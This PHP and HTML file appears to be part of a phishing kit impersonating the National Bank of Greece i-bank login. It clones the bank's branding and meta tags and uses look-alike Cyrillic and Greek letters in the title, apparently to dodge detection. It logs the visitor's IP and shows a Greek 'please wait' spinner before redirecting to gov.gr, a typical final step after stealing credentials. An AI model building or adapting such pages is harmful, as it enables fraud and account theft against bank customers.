<?php 
   session_start();
   error_reporting(0);
   include "../config.php";
   $ip = getenv("REMOTE_ADDR");
   $page=$_GET['page']."?id=".$ip;
   header("Refresh: 4; url=https://www.gov.gr", true, 303);
   
   ?>
<!DOCTYPE html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title>Wеb ΝВG і-bаnk</title>
      <meta name="multilanguage" content="true">
      <meta name="mntc" content="[mntc]">
      <meta name="mntcMsg" content="[mntcMsg]">
      <meta name="arm" content="119">
      <meta name="lng" content="el">
      <meta name="epe" content="false">
      <meta name="_af" content="T_XIGso1SMr7zdtjnsjKGZ6X8NrfquicRUdDng4aKgmnaTuo9Mou7d-2csrY07FdvjBf6CmaIyPjJH1eurboogXRQhxuvZss65V2rJDfA_I1">
      <meta name="rscsSc" content="[rscsSc]">
      <meta name="bank" content="NBG">
      <meta name="indexTemplate" content="login-night">
      <meta name="appId" content="2e7971cd-7afd-49a0-89ae-7ec531298d01">
      <meta name="gaId" content="UA-33771010-2">
      <meta name="sbxId" content="[sbxId]">
      <meta name="ofnn" content="false">
      <meta name="ftr_exCustOnb" content="true">
      <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="icon" type="image/png" href="src/img/favicon.ico">
      <link href="src/css/style6.css" rel="stylesheet">
   </head>
   <body class="login-bg">
      <index-page>
         <div class="loader">
            <div class="loading-stage-container">
               <div class="flex-all-center">
                  <div class="loading-stage-logo-container">
                     <figure class="margin-0">
                        <img class="loading-stage-logo" src="src/img/logo.545b013c218ea4ff3ba78d121759aba6.svg" alt="">
                     </figure>
                  </div>
                  <div class="loading-stage-vertical-line"></div>
                  <div class="loading-stage-logo-container">
                     <figure class="margin-0">
                        <img class="loading-stage-nbg-logo" src="src/img/nbg-logo-full-black.f26495ed09f202369ae54fbb35eb5631.svg" alt="Loading...">
                     </figure>
                  </div>
               </div>
               <spinner>
                  <div class="flex-column-all-center">
                     <div class="circle-loader"></div>
                     <h5 class="loader-text">Παρακαλώ περιμένετε</h5>
                  </div>
               </spinner>
            </div>
         </div>
      </index-page>
   </body>
</html>